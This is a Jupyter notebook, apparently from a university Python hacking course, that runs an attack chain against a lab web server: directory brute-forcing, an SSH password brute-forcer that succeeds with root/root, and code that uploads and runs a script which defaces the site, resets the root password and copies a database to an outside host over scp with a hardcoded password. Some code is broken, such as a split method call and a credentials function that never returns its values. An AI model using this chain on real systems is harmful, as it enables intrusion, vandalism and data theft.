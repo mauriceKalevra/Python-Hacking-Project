{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import queue\n",
    "import threading\n",
    "import os\n",
    "import requests\n",
    "from urllib.request import urlopen, Request\n",
    "from urllib.error import HTTPError\n",
    "from bs4 import BeautifulSoup\n",
    "from urllib import request\n",
    "import urllib.request, urllib.error, urllib.parse\n",
    "import re\n",
    "from selenium import webdriver\n",
    "import time\n",
    "import paramiko\n",
    "from collections import deque\n",
    "import sys\n",
    "import urllib3\n",
    "from selenium.webdriver.chrome.service import Service\n",
    "from selenium.webdriver.common.by import By"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {},
   "outputs": [],
   "source": [
    "class MySpider():\n",
    "    def __init__(self):\n",
    "        pass\n",
    "        \n",
    "    def mygobuster(self,target):\n",
    "        wordlist = [a.strip() for a in open(\"wordlist.txt\")]\n",
    "        filters = [\".html\",\".css\",\"jpg\", \"\",\".js\",\".md\",\".png\"]\n",
    "        html = open(\"html.txt\", \"a+\") \n",
    "        for word in wordlist:\n",
    "            for f in filters:\n",
    "                url = target+word+f\n",
    "                re = requests.head(url)\n",
    "\n",
    "                if re.status_code==301 or re.status_code==401:\n",
    "                    print(\"Directory found: \", re.url, re.status_code)\n",
    "                    newurl = re.url+\"/\"\n",
    "                    \n",
    "                    self.mygobuster(newurl)\n",
    "\n",
    "                elif re.status_code==200:\n",
    "                    print(\"Found: \", re.url, re.status_code)\n",
    "                    response = urllib.request.urlopen(url)\n",
    "                    if \".html\" in re.url:\n",
    "                        html.write(re.url+\"\\n\")\n",
    "                    try:\n",
    "                        Content = response.read().decode('utf-8')\n",
    "                        f = open(\"found/\"+str(re.url).replace(\"/\",\"\"), 'w+')\n",
    "                        f.write(Content)\n",
    "                        f.close()\n",
    "                    except:\n",
    "                        Content = response.read()\n",
    "                        f = open(\"found/\"+str(re.url).replace(\"/\",\"\"), 'wb+')\n",
    "                        f.write(Content)\n",
    "                        f.close()\n",
    "                else:\n",
    "                    continue\n",
    "\n",
    "    def CSSbuster(self, target):\n",
    "        r  = requests.get(\" http://172.17.0.2:1337/stylesheet.css\")\n",
    "        data = r.text\n",
    "        l = []\n",
    "        for i in re.findall('url\\(([^)]+)\\)',data):\n",
    "            l.append(i)\n",
    "        s = [x[2:].strip('\"\"') for x in l[:2]]\n",
    "        for j in s:\n",
    "            response = urllib.request.urlopen(target+j)\n",
    "            if response.code==200:\n",
    "                print(\"Picture found:\", target+j)\n",
    "                con = response.read()\n",
    "                f = open(\"found/\"+str(response.url).replace(\"/\",\"\"), 'wb+')\n",
    "                f.write(con)\n",
    "            else:\n",
    "                pass\n",
    "    \n",
    "    \n",
    "    def myBot(self):\n",
    "        s=Service('/home/sleven/Studium/Sem5/Hacking-mit-Python/geckodriver')\n",
    "        browser = webdriver.Firefox(service=s)\n",
    "        for url in open(\"html.txt\"):\n",
    "            if url==\"http://172.17.0.2:1337/biete.html\\n\":\n",
    "                browser.get(url)\n",
    "                time.sleep(1)\n",
    "                eingabe = browser.find_element(By.ID,\"ort\")\n",
    "                eingabe.send_keys(\"Salzburg\")\n",
    "                eingabe2 = browser.find_element(By.ID,\"preis\")\n",
    "                eingabe2.send_keys(\"1500\")\n",
    "                time.sleep(1)\n",
    "                eingabe2 = browser.find_element(By.ID,\"zimmer\")\n",
    "                eingabe2.send_keys(\"5\")\n",
    "                eingabe3 = browser.find_element(By.ID,\"flaeche\")\n",
    "                eingabe3.send_keys(\"500\")\n",
    "                eingabe4 = browser.find_element(By.ID,\"kontakt\")\n",
    "                eingabe4.send_keys(\"Mori.r@web.de\")\n",
    "                ein = browser.find_element(By.ID,\"saveimmoButton\")\n",
    "                ein.click()\n",
    "                time.sleep(1)\n",
    "            browser.get(url)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Directory found:  http://172.17.0.2:1337/data 301\n",
      "Directory found:  http://172.17.0.2:1337/data/about 301\n",
      "Found:  http://172.17.0.2:1337/data/about/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/data/faq 301\n",
      "Found:  http://172.17.0.2:1337/data/faq/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/data/impressum 301\n",
      "Found:  http://172.17.0.2:1337/data/impressum/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/data/datenschutz 301\n",
      "Found:  http://172.17.0.2:1337/data/datenschutz/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/data/about 301\n",
      "Found:  http://172.17.0.2:1337/data/about/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/data/impressum 301\n",
      "Found:  http://172.17.0.2:1337/data/impressum/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/img 301\n",
      "Directory found:  http://172.17.0.2:1337/img/background-images 301\n",
      "Found:  http://172.17.0.2:1337/about.html 200\n",
      "Found:  http://172.17.0.2:1337/index.html 200\n",
      "Found:  http://172.17.0.2:1337/biete.html 200\n",
      "Found:  http://172.17.0.2:1337/biete 200\n",
      "Found:  http://172.17.0.2:1337/angebote.html 200\n",
      "Found:  http://172.17.0.2:1337/faq.html 200\n",
      "Directory found:  http://172.17.0.2:1337/js 301\n",
      "Found:  http://172.17.0.2:1337/js/slideshow.js 200\n",
      "Directory found:  http://172.17.0.2:1337/static 301\n",
      "Directory found:  http://172.17.0.2:1337/static/js 301\n",
      "Directory found:  http://172.17.0.2:1337/static/css 301\n",
      "Found:  http://172.17.0.2:1337/static/css/bootstrap-grid.css 200\n",
      "Directory found:  http://172.17.0.2:1337/static/bootstrap-4.0.0 301\n",
      "Found:  http://172.17.0.2:1337/static/bootstrap-4.0.0/index.html 200\n",
      "Directory found:  http://172.17.0.2:1337/static/bootstrap-4.0.0/js 301\n",
      "Found:  http://172.17.0.2:1337/static/bootstrap-4.0.0/README.md 200\n",
      "Found:  http://172.17.0.2:1337/stylesheet.css 200\n",
      "Found:  http://172.17.0.2:1337/impressum.html 200\n",
      "Found:  http://172.17.0.2:1337/datenschutz.html 200\n",
      "Found:  http://172.17.0.2:1337/angebote.html 200\n",
      "Found:  http://172.17.0.2:1337/myangebote.html 200\n",
      "Found:  http://172.17.0.2:1337/suche.html 200\n",
      "Found:  http://172.17.0.2:1337/script.js 200\n",
      "Found:  http://172.17.0.2:1337/README.md 200\n",
      "Found:  http://172.17.0.2:1337/placeholder.png 200\n",
      "Directory found:  http://172.17.0.2:1337/favicon_io 301\n",
      "Found:  http://172.17.0.2:1337/about.html 200\n",
      "Found:  http://172.17.0.2:1337/impressum.html 200\n"
     ]
    }
   ],
   "source": [
    "#S = MySpider()\n",
    "S.mygobuster(\"http://172.17.0.2:1337/\")\n",
    "S.CSSbuster(\"http://172.17.0.2:1337/\")\n",
    "S.myBot()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**SSH Angriff**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "def attackssh(ip):\n",
    "    try:\n",
    "        global que\n",
    "        if len(que)==0:\n",
    "            print(\"Not found, maybe try a new wordlist?!\")\n",
    "            return 1\n",
    "        print(\"Attacking ssh.....\")\n",
    "        ssh = paramiko.SSHClient()\n",
    "        ssh.set_missin\n",
    "        _host_key_policy(paramiko.AutoAddPolicy())\n",
    "        for line in range(len(que)):\n",
    "            [username, password] = que.popleft().strip().split()\n",
    "            try:\n",
    "                print(f\"Trying with {username} {password}\")\n",
    "                conn = ssh.connect(ip, username=username,password=password, banner_timeout=200)\n",
    "                if conn is None:\n",
    "                    print(username)\n",
    "                    credentials = open(\"cred.txt\", \"r+\")\n",
    "                    credentials.write(username)\n",
    "                    credentials.write(\" \")\n",
    "                    credentials.write(password)\n",
    "                    print(f\"Successfully Authenticated with {username} {password}\")\n",
    "                    break\n",
    "            except paramiko.AuthenticationException:\n",
    "                print(\"Failed!\")\n",
    "                continue\n",
    "            \n",
    "            except paramiko.SSHException:\n",
    "                continue\n",
    "                \n",
    "    except NameError:\n",
    "        que = deque()\n",
    "        for word in open(\"sshwordlist.txt\", \"r\").readlines():\n",
    "            que.append(word)\n",
    "        attackssh(\"172.17.0.2\")        \n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Attacking ssh.....\n",
      "Trying with admin password\n",
      "Failed!\n",
      "Trying with root toor\n",
      "Failed!\n",
      "Trying with admin admin\n",
      "Failed!\n",
      "Trying with server admin\n",
      "Failed!\n",
      "Trying with sinus cosinus\n",
      "Failed!\n",
      "Trying with tangens riebert\n",
      "Failed!\n",
      "Trying with supp woritz\n",
      "Failed!\n",
      "Trying with win noch\n",
      "Failed!\n",
      "Trying with admin password\n",
      "Failed!\n",
      "Trying with root root\n",
      "root\n",
      "Successfully Authenticated with root root\n"
     ]
    }
   ],
   "source": [
    "attackssh(\"172.17.0.2\")        \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "#enumerate wordlist to check if recursive calling works properly\n",
    "file = open(\"sshwordlist.txt\")\n",
    "newfile = open(\"ssh\",\"w+\")\n",
    "for word, count in enumerate(file):\n",
    "        newfile.write(str(count)+str(word))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "def myscrape(url):\n",
    "    r = requests.get(url)\n",
    "    soup = BeautifulSoup(r.text,\"html.parser\")\n",
    "    \n",
    "    for links in soup.find_all(\"a\"):\n",
    "        href = links.attrs['href']\n",
    "        print(href)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Connecte zu server und lade datei hoch\n",
    "from pwn import *\n",
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Schadware"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "def getCredentials():\n",
    "    #hole gefunde credentials aus datei\n",
    "    cred = open('cred.txt','r').readlines()\n",
    "    #case zu string\n",
    "    cred_string = cred[0].split()\n",
    "    #lese username und passwort aus\n",
    "    user = cred_string[0]\n",
    "    pw = cred_string[1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "#send file to remote host\n",
    "def sendMalware():\n",
    "    getCredentials()\n",
    "    print(\"Sending SW.py to victim....\")\n",
    "    ostring = \"sshpass -p \" + pw +  \" scp -o StrictHostKeyChecking=no SW.py \"+ user+\"@172.17.0.2:/root\"\n",
    "    os.system(ostring)\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "def ExecMalware():\n",
    "    getCredentials()\n",
    "    import paramiko\n",
    "    import time\n",
    "    client = paramiko.SSHClient()\n",
    "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "    client.connect('172.17.0.2', username=user, password=pw)\n",
    "\n",
    "    time.sleep(1)\n",
    "    stdin, stdout, stderr = client.exec_command('apt install sshpass')\n",
    "    stdin, stdout, stderr = client.exec_command('python3 SW.py')\n",
    "    for line in stdout:\n",
    "        print(line)\n",
    "    client.close()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [],
   "source": [
    "#schadware.py\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 93,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import subprocess\n",
    "#suche mit linux-find, pfade mit der file endung html\n",
    "proc = subprocess.Popen(\"find / -name '*.html'\", shell=True, stdout=subprocess.PIPE)\n",
    "output = proc.stdout.readlines()\n",
    "for i in output:\n",
    "    if \"/public/index.html\" in str(i):\n",
    "        foundpath = i\n",
    "    else:\n",
    "        continue\n",
    "#defacement der website\n",
    "malware = open(\"../Web2-Projekt/public/index.html\",\"w+\")\n",
    "malware.write(\"<!DOCTYPE html><html><head><title>foobar</title><style>h1 {text-align: center;color: red</style></head><body><h1>You have been compromised</h1></body></html>\")\n",
    "\n",
    "#change-cred\n",
    "subprocess.run('echo -n \"pwned\\npwned\" | passwd root', shell=True)\n",
    "os.system(\"sshpass -p Freiburg1995 scp -o StrictHostKeyChecking=no ../Web2-Projekt/immobilie.db sleven@192.46.236.95:/home/sleven\")\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
